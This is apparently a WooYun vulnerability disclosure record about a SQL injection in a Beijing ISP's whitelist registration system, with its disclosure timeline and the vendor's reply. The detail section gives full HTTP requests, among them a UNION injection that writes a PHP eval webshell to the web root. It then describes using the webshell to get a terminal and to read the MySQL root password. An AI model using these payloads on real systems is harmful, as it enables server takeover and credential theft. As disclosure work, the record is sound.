{"id": 77365, "wybug_id": "wooyun-2015-0162679", "wybug_title": "时代宏远备案白名单登记系统存在注入漏洞可 GETSHELL", "wybug_corp": "北京时代宏远网络通信有限公司", "wybug_author": "glzjin", "wybug_date": "2015-12-20 21:54", "wybug_open_date": "2016-02-06 10:45", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向公众公开  简要描述： 白名单登记系统的一个注射漏洞，可以 GETSHELL 详细说明：  目标：http://**.**.**.**/首先是对操作进行抓包 可以发现注入点存在于这里 \nPOST http://**.**.**.**/index.php/bmd/dosubmit HTTP/1.1\t\t\t\tHost: **.**.**.**\t\t\t\tUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:42.0) Gecko/20100101 Firefox/42.0\t\t\t\tAccept: */*\t\t\t\tAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\t\t\t\tAccept-Encoding: gzip, deflate\t\t\t\tDNT: 1\t\t\t\tContent-Type: application/x-www-form-urlencoded; charset=UTF-8\t\t\t\tX-Requested-With: XMLHttpRequest\t\t\t\tReferer: http://**.**.**.**/\t\t\t\tContent-Length: 8\t\t\t\tCookie: Hm_lvt_cf15af24cbbc54d86b08019142283d7d=1447398749\t\t\t\tConnection: keep-alive\t\t\t\tPragma: no-cache\t\t\t\tCache-Control: no-cache\t\t\t\tdomain='\n 可以看到返回结果是 \nHTTP/1.1 500 Internal Server Error\t\t\t\tDate: Sat, 19 Dec 2015 05:28:23 GMT\t\t\t\tServer: Apache/2.2.3 (CentOS)\t\t\t\tX-Powered-By: PHP/5.1.6\t\t\t\tContent-Length: 1466\t\t\t\tConnection: close\t\t\t\tContent-Type: text/html; charset=UTF-8\t\t\t\t。。。。。。\t\t\t\t\t<div id=\"container\">\t\t\t\t\t\t<h1>A Database Error Occurred</h1>\t\t\t\t\t\t<p>Error Number: 1064</p><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' limit 1' at line 1</p><p>SELECT domain,type FROM `common_bmd` where domain = '======伦家是注入点========' limit 1 </p><p>Filename: /var/www/html/models/m_common.php</p><p>Line Number: 27</p>\t</div>\n   OK，我们用 union 开整，这里是两列，而且网站目录也有给到，所以我们已经直接构造请求写 webshell 就好= = \nPOST http://**.**.**.**/index.php/bmd/dosubmit HTTP/1.1\t\t\t\tHost: **.**.**.**\t\t\t\tUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:42.0) Gecko/20100101 Firefox/42.0\t\t\t\tAccept: */*\t\t\t\tAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\t\t\t\tAccept-Encoding: gzip, deflate\t\t\t\tDNT: 1\t\t\t\tContent-Type: application/x-www-form-urlencoded; charset=UTF-8\t\t\t\tX-Requested-With: XMLHttpRequest\t\t\t\tReferer: http://**.**.**.**/\t\t\t\tContent-Length: 93\t\t\t\tCookie: Hm_lvt_cf15af24cbbc54d86b08019142283d7d=1447398749\t\t\t\tConnection: keep-alive\t\t\t\tPragma: no-cache\t\t\t\tCache-Control: no-cache\t\t\t\tdomain=' union Select 1,'< ?php eval($_POST[cmd]);?>' into outfile '/var/www/html/test2.php' #\n 然后，访问一下 http://**.**.**.**/test2.php , 可以发现已经写入成功了， \n\n 然后就是上菜刀， \n\n 看看，可以了 \n\n然后是虚拟终端 - -话说为毛同样是云主机这个的主频高一些= = 求升级我那台\n\n然后可以看到数据库的配置文件，拿到 Mysql 的 root 密码\n\n然后，进去看看\n\n   漏洞证明：  上面那里证明了那么多= =往上看\n\n   修复方案：  加过滤咯，要提高自己的姿势水平= =话说顺便求升级我那台云主机，那代理商不让我升级= =/   版权声明：转载请注明来源 glzjin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-12-24 18:02 厂商回复： CNVD未直接复现所述情况，已由CNVD通过网站管理方公开联系渠道向其邮件通报，由其后续提供解决方案。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}